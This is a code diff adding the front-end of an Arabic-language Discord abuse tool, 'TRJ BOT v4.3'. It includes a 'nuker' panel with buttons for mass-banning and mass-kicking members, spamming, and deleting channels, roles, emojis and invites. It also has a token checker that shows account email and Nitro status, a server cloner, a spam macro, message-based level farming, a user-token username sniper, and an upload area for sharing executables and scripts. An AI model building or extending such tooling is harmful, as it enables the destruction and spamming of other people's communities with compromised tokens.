+                  <input type="text" value={newToolName} onChange={e => setNewToolName(e.target.value)} placeholder="مثال: Nuker Pro" className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none focus:border-purple-400/50 transition-colors" />
+                </div>
+                <div>
+                  <label className="text-[11px] text-white/50 mb-1 block">التصنيف</label>
+                  <select value={newToolCategory} onChange={e => setNewToolCategory(e.target.value)} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-purple-400/50 transition-colors">
+                    <option value="أدوات">أدوات</option>
+                    <option value="سكربتات">سكربتات</option>
+                    <option value="بوتات">بوتات</option>
+                    <option value="إضافات">إضافات</option>
+                    <option value="أخرى">أخرى</option>
+                  </select>
+                </div>
+              </div>
+
+              <div className="mb-3">
+                <label className="text-[11px] text-white/50 mb-1 block">الوصف</label>
+                <textarea value={newToolDesc} onChange={e => setNewToolDesc(e.target.value)} placeholder="وصف الأداة..." rows={2} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 resize-none focus:outline-none focus:border-purple-400/50 transition-colors" />
+              </div>
+
+              <div className="mb-3">
+                <label className="text-[11px] text-white/50 mb-1 block">اسم المنشئ</label>
+                <input type="text" value={newToolAuthor} onChange={e => setNewToolAuthor(e.target.value)} placeholder="اسمك" className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none focus:border-purple-400/50 transition-colors" />
+              </div>
+
+              {/* File Upload */}
+              <div className="mb-4">
+                <label className="text-[11px] text-white/50 mb-1 block">رفع ملف (RAR, ZIP, EXE, JS, PY...)</label>
+                <div className="relative">
+                  <input type="file" accept=".rar,.zip,.exe,.js,.py,.ts,.json,.txt,.bat,.cmd,.ahk" onChange={e => setNewToolFile(e.target.files?.[0] || null)} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm file:bg-purple-500/20 file:text-purple-300 file:border-0 file:rounded-lg file:px-3 file:py-1 file:mr-3 file:cursor-pointer file:text-xs file:border-l file:border-l-purple-500/30 focus:outline-none focus:border-purple-400/50 transition-colors" />
+                </div>
+                {newToolFile && (
+                  <div className="mt-2 flex items-center gap-2 bg-purple-500/8 rounded-lg px-3 py-2 border border-purple-500/15">
+                    <span className="text-sm">📎</span>
+                    <span className="text-xs text-purple-300">{newToolFile.name}</span>
+                    <span className="text-[10px] text-purple-400/50">({(newToolFile.size / 1024).toFixed(1)} KB)</span>
+                  </div>
+                )}
+              </div>
+
+              <button onClick={async () => {
+                if (!newToolName || !newToolFile) { setResult('❌ أدخل اسم الأداة وارفع ملف'); return }
+                const reader = new FileReader()
+                reader.onload = () => {
+                  const base64 = reader.result as string
+                  const newTool: ToolEntry = {
+                    id: Date.now().toString(36) + Math.random().toString(36).substring(2),
+                    name: newToolName,
+                    description: newToolDesc || 'بدون وصف',
+                    fileName: newToolFile!.name,
+                    fileSize: newToolFile!.size > 1024 * 1024 ? (newToolFile!.size / 1024 / 1024).toFixed(1) + ' MB' : (newToolFile!.size / 1024).toFixed(1) + ' KB',
+                    fileData: base64,
+                    fileType: newToolFile!.name.split('.').pop()?.toUpperCase() || 'FILE',
+                    category: newToolCategory,
+                    author: newToolAuthor || 'مجهول',
+                    downloads: 0,
+                    createdAt: new Date().toLocaleDateString('ar-SA')
+                  }
+                  setTools(prev => [newTool, ...prev])
+                  setNewToolName(''); setNewToolDesc(''); setNewToolCategory('أدوات'); setNewToolAuthor(''); setNewToolFile(null)
+                  setResult('✅ تم رفع الأداة بنجاح!')
+                }
+                reader.readAsDataURL(newToolFile!)
+              }} className="w-full py-3 rounded-xl font-bold text-sm transition-all cursor-pointer border bg-purple-500/20 hover:bg-purple-500/30 text-purple-400 border-purple-500/30 active:scale-[0.98]">
+                📤 رفع الأداة
+              </button>
+            </div>
+
+            {result && landingView === 'tool' && (
+              <div className={`mb-4 p-4 rounded-2xl text-sm font-medium border animate-fade-in ${result.startsWith('✅') ? 'bg-green-500/10 text-green-400 border-green-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{result}</div>
+            )}
+
+            {/* Tools Grid */}
+            <div className="mb-4">
+              <h3 className="text-sm font-bold text-slate-400 mb-3 flex items-center gap-2">
+                <span>📚</span> الأدوات المتاحة
+              </h3>
+              {tools.length === 0 ? (
+                <div className="glass-card rounded-2xl p-8 border border-slate-700/30 text-center">
+                  <div className="text-4xl mb-3">📭</div>
+                  <p className="text-slate-500 text-sm">لا توجد أدوات بعد</p>
+                  <p className="text-slate-600 text-xs mt-1">كن أول من يرفع أداة!</p>
+                </div>
+              ) : (
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                  {tools.map(tool => (
+                    <div key={tool.id} className="glass-card rounded-xl p-4 border border-slate-700/30 hover:border-purple-500/20 transition-all animate-fade-in">
+                      <div className="flex items-start justify-between mb-2">
+                        <div>
+                          <h4 className="text-sm font-bold text-white">{tool.name}</h4>
+                          <div className="flex items-center gap-2 mt-0.5">
+                            <span className="text-[10px] text-purple-400/60 bg-purple-500/8 px-2 py-0.5 rounded-full border border-purple-500/10">{tool.category}</span>
+                            <span className="text-[10px] text-emerald-400/60 bg-emerald-500/8 px-2 py-0.5 rounded-full border border-emerald-500/10">{tool.fileType}</span>
+                          </div>
+                        </div>
+                        <span className="text-[10px] text-slate-600">{tool.createdAt}</span>
+                      </div>
+                      <p className="text-[11px] text-slate-500 mb-3 line-clamp-2">{tool.description}</p>
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-2">
+                          <span className="text-[10px] text-slate-500">👤 {tool.author}</span>
+                          <span className="text-[10px] text-slate-600">📁 {tool.fileSize}</span>
+                          <span className="text-[10px] text-slate-600">⬇️ {tool.downloads}</span>
+                        </div>
+                        <div className="flex gap-1.5">
+                          <button onClick={() => {
+                            if (!tool.fileData) { setResult('❌ الملف غير متاح - يرجى رفع الأداة مرة أخرى'); return }
+                            const a = document.createElement('a')
+                            a.href = tool.fileData
+                            a.download = tool.fileName
+                            a.click()
+                            setTools(prev => prev.map(t => t.id === tool.id ? { ...t, downloads: t.downloads + 1 } : t))
+                          }} className="text-[10px] text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-lg border border-emerald-500/20 hover:bg-emerald-500/20 transition-colors cursor-pointer">{!tool.fileData ? '⚠️ ملف غير متاح' : '⬇️ تحميل'}</button>
+                          <button onClick={() => setTools(prev => prev.filter(t => t.id !== tool.id))} className="text-[10px] text-red-400 bg-red-500/10 px-2.5 py-1 rounded-lg border border-red-500/20 hover:bg-red-500/20 transition-colors cursor-pointer">🗑️</button>
+                        </div>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+          </main>
+        </div>
+      )}
+
+      {/* ===== MAIN APP ===== */}
+      {landingView === 'app' && (
+      <>
+      <header className="header-modern sticky top-0 z-50 px-4 py-3.5">
+        <div className="max-w-6xl mx-auto flex items-center justify-between">
+          <h1 className="text-xl font-bold flex items-center gap-2.5">
+            <span className="text-2xl">🛡️</span>
+            <span className="text-gradient-green font-black text-2xl tracking-tight">TRJ BOT</span>
+            <span className="text-[10px] text-emerald-400/70 bg-emerald-500/8 px-2.5 py-0.5 rounded-full border border-emerald-500/15 ml-1 font-semibold">v4.3</span>
+          </h1>
+          <div className="flex items-center gap-2">
+            <button onClick={() => setShowTokenGuide(true)} className="text-[10px] text-cyan-400/80 bg-cyan-500/8 px-3 py-1.5 rounded-full border border-cyan-500/15 hover:bg-cyan-500/15 hover:text-cyan-300 transition-all cursor-pointer font-medium">🎫 كيف تجيب توكن</button>
+            <button onClick={() => setShowProfile(true)} className="text-[10px] text-purple-400/80 bg-purple-500/8 px-3 py-1.5 rounded-full border border-purple-500/15 hover:bg-purple-500/15 hover:text-purple-300 transition-all cursor-pointer font-medium">👤 بروفايل</button>
+            <span className="text-[10px] text-emerald-400/60 bg-emerald-500/8 px-3 py-1.5 rounded-full border border-emerald-500/15 font-medium hidden sm:inline-block">⚡ 34 ميزة</span>
+          </div>
+        </div>
+      </header>
+
+      <div className="max-w-6xl mx-auto flex relative z-10">
+        <aside className="w-64 min-h-screen sidebar-modern p-3 hidden lg:block sticky top-[57px] self-start overflow-auto max-h-[calc(100vh-57px)] border-slate-700/30">
+          <div className="text-center mb-5 pb-4 border-b border-white/5"><div className="text-3xl mb-1">🛡️</div><h2 className="text-base font-black text-gradient-green tracking-tight">TRJ BOT</h2><p className="text-[10px] text-slate-600 mt-0.5">v4.3</p></div>
+          <nav className="space-y-0.5">
+            {sections.map(s => (
+              <button key={s.id} onClick={() => { if (s.id === 'profile') { setShowProfile(true); return }; setSection(s.id); clearState() }} className={`nav-item w-full flex items-center gap-2.5 px-3 py-2 text-[13px] border ${section === s.id ? 'active text-emerald-400 border-emerald-500/20' : 'text-slate-500 hover:bg-slate-800/50 hover:text-slate-300 border-transparent'}`}>
+                <span className="text-base">{s.icon}</span><span className="font-medium">{s.name}</span>
+              </button>
+            ))}
+          </nav>
+          <div className="mt-6 pt-3 border-t border-white/5 text-center"><p className="text-[10px] text-slate-600">صنع بواسطة</p><p className="text-xs font-bold text-gradient-green">Discord: trj.py</p></div>
+        </aside>
+
+        <nav className="lg:hidden fixed bottom-0 left-0 right-0 bottom-nav px-1 py-1.5 z-50">
+          <div className="flex justify-around overflow-x-auto">
+            {sections.slice(0, 6).map(s => (
+              <button key={s.id} onClick={() => { if (s.id === 'profile') { setShowProfile(true); return }; setSection(s.id); clearState() }} className={`flex flex-col items-center p-1.5 rounded-xl transition-all min-w-[48px] ${section === s.id ? 'bg-emerald-500/15 text-emerald-400' : 'text-slate-600'}`}>
+                <span className="text-lg">{s.icon}</span><span className="text-[9px] mt-0.5">{s.name}</span>
+              </button>
+            ))}
+          </div>
+          <div className="flex justify-around mt-1 pt-1 border-t border-slate-700/20 overflow-x-auto">
+            {sections.slice(6).map(s => (
+              <button key={s.id} onClick={() => { if (s.id === 'profile') { setShowProfile(true); return }; setSection(s.id); clearState() }} className={`flex flex-col items-center p-1.5 rounded-xl transition-all min-w-[48px] ${section === s.id ? 'bg-emerald-500/15 text-emerald-400' : 'text-slate-600'}`}>
+                <span className="text-lg">{s.icon}</span><span className="text-[9px] mt-0.5">{s.name}</span>
+              </button>
+            ))}
+          </div>
+        </nav>
+
+        <main className="flex-1 p-4 lg:p-6 pb-28 lg:pb-8">
+          <div className="max-w-2xl mx-auto">
+
+            {loading && (<div className="mb-4 animate-fade-in"><div className="glass-card rounded-xl p-3.5 border border-emerald-500/15 flex items-center gap-3"><div className="trj-spinner" /><span className="text-sm text-emerald-400/80">{progress || '⏳ جاري التنفيذ...'}</span></div></div>)}
+
+            {/* ==================== VERIFY ==================== */}
+            {section === 'verify' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔑</span><h2 className="text-xl font-black text-gradient-green">تحقق من التوكن</h2></div>
+                <p className="text-slate-500 text-sm mb-5">تحقق من صلاحية أي توكن (بوت / يوزر) مع معلومات تفصيلية</p>
+                <TokenInput label="🎫 التوكن" value={verifyToken} onChange={setVerifyToken} onHelp={() => setShowTokenGuide(true)} />
+                <ActionBtn text="🔍 تحقق الآن" loading={loading} onClick={async () => { const data = await api('verify', { token: verifyToken }); if (data) setVerifyData({ type: data.type, name: data.name, id: data.id, email: data.email, nitro: data.nitro, verified: data.verified, createdAt: data.createdAt, flags: data.flags }) }} />
+                {verifyData && (<div className="mt-5 bg-slate-800/50 rounded-2xl p-6 border border-slate-700/20 text-center animate-fade-in">
+                  <div className="text-5xl mb-3">{verifyData.type === 'bot' ? '🤖' : '👤'}</div>
+                  <div className="text-xl font-black text-gradient-green mb-1">{verifyData.type === 'bot' ? 'بوت' : 'حساب يوزر'}</div>
+                  <div className="text-emerald-300 text-lg font-medium">{verifyData.name}</div>
+                  <div className="text-xs text-slate-500 font-mono mt-2">{verifyData.id}</div>
+                  <div className="grid grid-cols-2 gap-2 mt-4">{verifyData.email && <InfoPill label="البريد" value={verifyData.email} />}{verifyData.nitro && <InfoPill label="نيترو" value={verifyData.nitro} />}{verifyData.verified && <InfoPill label="الحالة" value={verifyData.verified} />}{verifyData.createdAt && <InfoPill label="التسجيل" value={verifyData.createdAt} />}</div>
+                </div>)}
+              </div></div>
+            )}
+
+            {/* ==================== NUKER ==================== */}
+            {section === 'nuker' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💥</span><h2 className="text-xl font-black text-red-400">نيوكر سيرفر</h2></div>
+                <p className="text-slate-500 text-sm mb-5">⚡ فائق السرعة - 50 روم بالتوازي + 100 حظر/طرد بالتوازي + كشف تلقائي للـ Rate Limit</p>
+                <TokenInput label="🎫 التوكن" value={nukerToken} onChange={setNukerToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="📋 أيدي السيرفر" value={guildId} onChange={setGuildId} placeholder="Guild ID" accent="red" />
+                <div className="bg-red-500/5 rounded-xl p-4 mb-5 border border-red-500/15">
+                  <h3 className="text-xs font-bold text-red-400 mb-3 flex items-center gap-1.5">⚙️ خيارات</h3>
+                  <div className="grid grid-cols-2 gap-3 mb-3">
+                    <div><label className="text-[11px] text-red-300/70">اسم الرومات الجديدة</label><input type="text" value={nukeChannelName} onChange={e => setNukeChannelName(e.target.value)} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
+                    <div><label className="text-[11px] text-red-300/70">تغيير اسم الرومات لـ</label><input type="text" value={nukeRenameCh} onChange={e => setNukeRenameCh(e.target.value)} placeholder="nuked" className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
+                    <div><label className="text-[11px] text-red-300/70">عدد الرومات (max 500)</label><input type="number" value={nukeChannelCount} onChange={e => setNukeChannelCount(Math.min(Number(e.target.value), 500))} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
+                    <div><label className="text-[11px] text-red-300/70">رسائل لكل روم</label><input type="number" value={nukeMsgPerChannel} onChange={e => setNukeMsgPerChannel(Number(e.target.value))} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
+                    <div><label className="text-[11px] text-red-300/70">Slowmode (ثانية, 0=إيقاف)</label><input type="number" value={nukeSlowmode} onChange={e => setNukeSlowmode(Number(e.target.value))} min={0} max={21600} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
+                  </div>
+                  <div><label className="text-[11px] text-red-300/70">💬 رسالة السبام</label><textarea value={nukeMsg} onChange={e => setNukeMsg(e.target.value)} rows={2} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 resize-none focus:outline-none focus:border-red-400/50 transition-colors" /></div>
+                </div>
+                <div className="grid grid-cols-2 gap-2.5">
+                  <NukerBtn text="💀 تدمير كامل" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'destroy', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg, name: nukeChannelName })} />
+                  <NukerBtn text="💥 نيوكر (رومات+سبام)" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'nuke', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg })} />
+                  <NukerBtn text="🔨 حظر الكل" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'banall' })} />
+                  <NukerBtn text="👢 طرد الكل" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'kickall' })} />
+                  <NukerBtn text="📢 سبام" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'spam', message: nukeMsg, msgPerChannel: nukeMsgPerChannel })} />
+                  <NukerBtn text="🗑️ حذف الرومات" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_channels' })} />
+                  <NukerBtn text="🗑️ حذف الرتب" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_roles' })} />
+                  <NukerBtn text="🔤 تغيير أسماء الرومات" color="cyan" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'rename_channels', renameChannels: nukeRenameCh })} />
+                  <NukerBtn text="🔤 تغيير اسم السيرفر" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'rename', name: nukeChannelName })} />
+                  <NukerBtn text="🎭 إنشاء 50 رتبة" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_roles', createRolesCount: 50, rolesName: nukeRenameCh })} />
+                  <NukerBtn text="🔢 عدد الرتب" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_roles', createRolesCount: Math.max(nukeChannelCount, 1), rolesName: nukeRenameCh })} />
+                  <NukerBtn text="😀 حذف الإيموجي" color="yellow" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_emojis' })} />
+                  <NukerBtn text="⏱️ تفعيل Slowmode" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'slowmode', slowmodeSeconds: nukeSlowmode || 21600 })} />
+                  <NukerBtn text="📺 إنشاء رومات فقط" color="green" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_channels', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg })} />
+                  <NukerBtn text="📁 إنشاء كاتيجوريات" color="green" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_categories', channelName: nukeChannelName, channelCount: nukeChannelCount })} />
+                  <NukerBtn text="🔗 حذف الدعوات" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_invites' })} />
+                </div>
+              </div></div>
+            )}
+
+            {/* ==================== COPY ==================== */}
+            {section === 'copy' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📋</span><h2 className="text-xl font-black text-gradient-green">نسخ سيرفر</h2></div>
+                <p className="text-slate-500 text-sm mb-5">نسخ سيرفر كامل بالتوازي - رتب + رومات + إعدادات + إيموجي + صلاحيات</p>
+                <TokenInput label="🎫 التوكن" value={copyToken} onChange={setCopyToken} onHelp={() => setShowTokenGuide(true)} /><TextInput label="📥 أيدي المصدر" value={sourceId} onChange={setSourceId} placeholder="Source Guild ID" /><TextInput label="📤 أيدي الهدف" value={targetId} onChange={setTargetId} placeholder="Target Guild ID" />
+                <div className="flex gap-3 mb-5 flex-wrap">{[{ key: 'roles' as const, label: '🎭 رتب' }, { key: 'channels' as const, label: '📺 رومات' }, { key: 'settings' as const, label: '⚙️ إعدادات' }].map(opt => (<label key={opt.key} className="flex items-center gap-2 text-xs text-emerald-300/80 bg-slate-800/50 px-3 py-2 rounded-lg border border-slate-700/20 cursor-pointer hover:bg-slate-700/30 transition-colors"><input type="checkbox" checked={copyOptions[opt.key]} onChange={e => setCopyOptions({ ...copyOptions, [opt.key]: e.target.checked })} className="accent-emerald-500 w-3.5 h-3.5" />{opt.label}</label>))}</div>
+                <ActionBtn text="📋 بدء النسخ" loading={loading} onClick={async () => {
+                  if (!copyToken || !sourceId || !targetId) { setResult('❌ أدخل التوكن + أيدي المصدر والهدف'); return }
+                  setLoading(true); setProgress('📋 جاري النسخ...'); setResult(''); setStats(null)
+                  try {
+                    const res = await fetch('/api/copy', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: copyToken, sourceId, targetId, options: copyOptions }) })
+                    const ct = res.headers.get('content-type') || ''
+                    if (!ct.includes('text/event-stream')) { const err = await res.json().catch(() => null); if (err?.error) { setResult('❌ ' + err.error); setLoading(false); setProgress(''); return } }
+                    const reader = res.body?.getReader()
+                    if (!reader) { setResult('❌ خطأ في الاتصال'); setLoading(false); setProgress(''); return }
+                    const decoder = new TextDecoder(); let buffer = ''
+                    while (true) {
+                      const { done, value } = await reader.read()
+                      if (done) break
+                      buffer += decoder.decode(value, { stream: true })
+                      const lines = buffer.split('\n'); buffer = lines.pop() || ''
+                      for (const line of lines) {
+                        if (!line.startsWith('data: ')) continue
+                        try {
+                          const event = JSON.parse(line.substring(6))
+                          if (event.type === 'progress') setProgress(event.message)
+                          else if (event.type === 'stats') setStats(event.stats)
+                          else if (event.type === 'done') { if (event.success) { setResult(event.message || '✅ تم النسخ بنجاح!'); if (event.stats) setStats(event.stats) } else setResult('❌ ' + (event.error || 'فشل')) }
+                          else if (event.type === 'error') setResult('❌ ' + event.message)
+                        } catch {}
+                      }
+                    }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />
+              </div></div>
+            )}
+
+            {/* ==================== SPAM ==================== */}
+            {section === 'spam' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-orange-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">⚡</span><h2 className="text-xl font-black text-orange-400">تسطير - ماكرو</h2></div>
+                <p className="text-slate-500 text-sm mb-5">إرسال 5 رسائل بالتوازي - أسرع بمرتين!</p>
+                <TokenInput label="🎫 التوكن" value={spamToken} onChange={setSpamToken} accent="orange" onHelp={() => setShowTokenGuide(true)} /><TextInput label="📺 أيدي الروم" value={channelId} onChange={setChannelId} placeholder="Channel ID" accent="orange" />
+                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">📝 الرسائل (كل سطر يرسل لوحده)</label><textarea value={messages} onChange={e => setMessages(e.target.value)} placeholder={"رسالة 1\nرسالة 2\nرسالة 3"} rows={4} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
+                <div className="grid grid-cols-2 gap-3 mb-5">
+                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={duration} onChange={e => setDuration(Number(e.target.value))} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
+                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={speed} onChange={e => setSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
+                </div>
+                <ActionBtn text="⚡ بدء التسطير" loading={loading} color="orange" onClick={() => { const msgList = messages.split('\n').map(m => m.trim()).filter(Boolean); if (msgList.length === 0) { setResult('❌ أدخل رسالة واحدة على الأقل'); return }; api('macro', { token: spamToken, channelId, messages: msgList, duration, speed }) }} />
+              </div></div>
+            )}
+
+            {/* ==================== LEVELING ==================== */}
+            {section === 'leveling' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📈</span><h2 className="text-xl font-black text-gradient-green">تلفيل حساب</h2></div>
+                <p className="text-slate-500 text-sm mb-5">رفع لفل الحساب - 5 رسائل بالتوازي</p>
+                <TokenInput label="🎫 التوكن" value={levelingToken} onChange={setLevelingToken} onHelp={() => setShowTokenGuide(true)} /><TextInput label="📺 أيدي الروم" value={levelingChannelId} onChange={setLevelingChannelId} placeholder="Channel ID" />
+                <div className="grid grid-cols-2 gap-3 mb-5">
+                  <div><label className="text-[11px] text-green-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={levelingDuration} onChange={e => setLevelingDuration(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div>
+                  <div><label className="text-[11px] text-green-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={levelingSpeed} onChange={e => setLevelingSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div>
+                </div>
+                <ActionBtn text="📈 بدء التلفيل" loading={loading} onClick={() => api('leveling', { token: levelingToken, channelId: levelingChannelId, duration: levelingDuration, speed: levelingSpeed })} />
+              </div></div>
+            )}
+
+            {/* ==================== SNIPER ==================== */}
+            {section === 'sniper' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
+                <div className="flex items-center justify-between mb-1"><div className="flex items-center gap-3"><span className="text-2xl">🎯</span><h2 className="text-xl font-black text-gradient-green">صيد يوزرات</h2></div>
+                  <div className="flex gap-1.5">
+                    <button onClick={async () => { if (!sniperToken) { setResult('❌ أدخل التوكن أولاً'); return }; setLoading(true); setProgress('🔍 جلب معلومات الحساب...'); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'accountInfo' }) }); const data = await res.json(); if (data.success) { setSniperAccountInfo(data.info); setResult('') } else { setResult(`❌ ${data.error}`) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} className="text-xs text-cyan-400 bg-cyan-500/10 px-2.5 py-1.5 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer">👤</button>
+                    <button onClick={async () => { if (!sniperToken) { setResult('❌ أدخل التوكن أولاً'); return }; setLoading(true); setProgress('🧪 فحص تجريبي بـ 3 طرق...'); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'test' }) }); const data = await res.json(); if (data.success) { const t = data.test; let out = '🧪 فحص تجريبي - 3 طرق\nالحساب: ' + t.account + ' | MFA: ' + (t.mfa ? 'نعم' : 'لا') + ' | Phone: ' + (t.phone ? 'نعم' : 'لا') + ' | Verified: ' + (t.verified ? 'نعم' : 'لا') + '\n'; for (const r of t.results) { out += '\n━━ ' + r.label + ' ━━\n'; for (const m of r.results) { out += '  [' + (m.method || '?') + '] ' + m.status; if (m.debug) out += ' (' + m.debug + ')'; out += '\n'; } } setResult(out) } else { setResult('❌ ' + data.error) } } catch (e: any) { setResult('❌ خطأ: ' + (e.message || 'غير معروف')) }; setLoading(false); setProgress('') }} className="text-xs text-purple-400 bg-purple-500/10 px-2.5 py-1.5 rounded-lg border border-purple-500/20 hover:bg-purple-500/20 transition-colors cursor-pointer">🧪 فحص</button>
+                  </div>
+                </div>
+                <p className="text-slate-500 text-sm mb-5">{'⚡ يستخدم 3 طرق: pomelo-attempt + PATCH /users/@me + GET /users/{name}'}</p>
+                {sniperAccountInfo && (<div className="mb-4 bg-cyan-500/5 rounded-xl p-4 border border-cyan-500/15 animate-fade-in">
+                  <div className="flex items-center gap-3 mb-2"><div className="w-10 h-10 rounded-full bg-gradient-to-br from-cyan-400 to-blue-500 flex items-center justify-center text-white font-bold text-sm">{(sniperAccountInfo.username || '?')[0].toUpperCase()}</div><div><div className="text-sm font-bold text-cyan-300">{sniperAccountInfo.username}</div><div className="text-[10px] text-cyan-500/60 font-mono">{sniperAccountInfo.id}</div></div><div className="ml-auto flex gap-2">{sniperAccountInfo.mfa && <span className="text-[10px] text-green-400 bg-green-500/10 px-2 py-0.5 rounded-full border border-green-500/20">🔒 MFA</span>}{sniperAccountInfo.nitro !== 'None' && <span className="text-[10px] text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded-full border border-purple-500/20">💎 {sniperAccountInfo.nitro}</span>}</div></div>
+                  {availableNames.length > 0 && (<div className="mt-3"><button onClick={async () => { const name = availableNames[0]; setLoading(true); setProgress(`🔄 جاري تغيير اليوزر إلى: ${name}...`); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'changeUsername', targetUsername: name }) }); const data = await res.json(); if (data.success) setResult(`✅ تم تغيير اليوزر إلى: ${name}`); else setResult(`❌ ${data.error}`) } catch { setResult('❌ خطأ') }; setLoading(false); setProgress('') }} className="text-xs text-green-400 bg-green-500/15 px-3 py-2 rounded-lg border border-green-500/25 hover:bg-green-500/25 transition-colors cursor-pointer font-bold">🎯 خذ {availableNames[0]}</button></div>)}
+                </div>)}
+                <TokenInput label="🎫 توكن يوزر" value={sniperToken} onChange={setSniperToken} onHelp={() => setShowTokenGuide(true)} />
+                <div className="bg-red-500/5 rounded-xl p-3 mb-4 border border-red-500/10"><p className="text-[11px] text-red-400/80">⚠️ يجب استخدام توكن يوزر (User Token) وليس توكن بوت!</p></div>
